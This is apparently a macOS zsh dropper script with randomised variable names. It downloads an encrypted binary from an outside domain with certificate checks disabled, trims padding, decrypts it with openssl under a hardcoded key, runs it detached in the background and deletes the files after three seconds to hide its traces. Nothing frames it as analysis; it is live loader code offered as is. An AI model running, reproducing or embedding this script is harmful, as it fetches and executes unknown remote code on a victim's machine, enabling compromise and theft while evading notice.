#!/bin/zsh
yex5u=$(mktemp /tmp/f3ve88.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m6031f8c815a52da2.bin" -o "$yex5uz" || exit 1
yjfn9e=$(stat -f %z "$yex5uz"); azzmnyb=$(( yjfn9e - 2312 - 1245 ))
tail -c +$(( 2312 + 1 )) "$yex5uz" | head -c $azzmnyb | openssl enc -d -aes-256-cbc -k fdcfb16811b076e3221ffe56 -out "$yex5u" 2>/dev/null
[ -s "$yex5u" ] && chmod 700 "$yex5u" && ( "$yex5u" & ) && disown
( sleep 3; rm -f "$yex5u" "$yex5uz" ) &>/dev/null &
